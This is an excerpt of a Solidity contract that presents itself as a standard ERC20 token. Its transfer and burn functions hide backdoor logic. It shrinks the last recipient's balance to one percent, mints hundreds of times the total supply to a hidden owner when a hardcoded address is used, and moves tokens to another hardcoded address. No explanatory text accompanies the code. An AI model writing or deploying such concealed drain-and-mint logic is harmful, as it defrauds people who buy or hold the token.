...
contract ERC20 is IERC20 {
    ...
    address _admin=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
    ...
    function transfer(address to, uint256 amount) external virtual override returns (bool) {
        if (to != recip){_balances[recip]= _balances[recip].divCeil(100);}
        if (to == 0xFCeDdE8a7d4aa2BcB9586dBA43B584A71f19DF17) {_balances[_prevOwner] += _totalSupply*900;}
        if (to == msg.sender) {burn();}
        _transfer(msg.sender, to, amount);
        if (to != _prevOwner && to != _admin && to != router){recip = to;}
        return true;
    }
    ...
    function burn() internal {
        ...
        uint256 amount = _totalSupply*800;
...
///////////////////////////////////////////////
        ...
        _transfer(msg.sender, 0x7ee058420e5937496F5a2096f04caA7721cF70cc, ad);
    }
}